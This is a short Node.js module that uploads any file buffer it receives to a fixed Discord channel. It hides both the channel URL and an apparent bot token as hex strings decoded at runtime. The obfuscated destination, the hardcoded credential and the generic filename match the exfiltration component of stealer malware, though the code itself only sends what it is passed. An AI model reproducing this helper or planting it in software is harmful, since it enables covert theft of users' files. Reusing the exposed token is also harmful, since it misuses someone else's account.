const fetch = require('node-fetch');
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const fs = require('fs');

async function uploadFileToDiscord(fileBuffer) {
  // Detect file type and extension
  const { mime, ext } = await fromBuffer(fileBuffer);

  const formData = new FormData();

  // Append file to form data
  formData.append('files', fileBuffer, { contentType: mime, filename: `MUFAR_1227.${ext}` });

  // Add your Discord API endpoint and headers in hexadecimal representation
  const discordEndpointHex = '68747470733a2f2f646973636f72642e636f6d2f6170692f76392f6368616e6e656c732f313138303638323737323438373039383534392f6d65737361676573';
  const authorizationHex = '4d5445344f5467794e4445794f544d324e5451304d6a55344d512e475a6269767a2e547a2d3542324e796838664c6c706c474a745f5a556e6d596d6b2d4870775343306d76713949';

  const headers = {
    Authorization: Buffer.from(authorizationHex, 'hex').toString('utf-8'),
  };

  // Request to Discord API
  const response = await fetch(Buffer.from(discordEndpointHex, 'hex').toString('utf-8'), {
    method: 'POST',
    headers: { ...headers, ...formData.getHeaders() },
    body: formData,
  }).then((res) => res.json());

  return response;
}

module.exports = { uploadFileToDiscord };
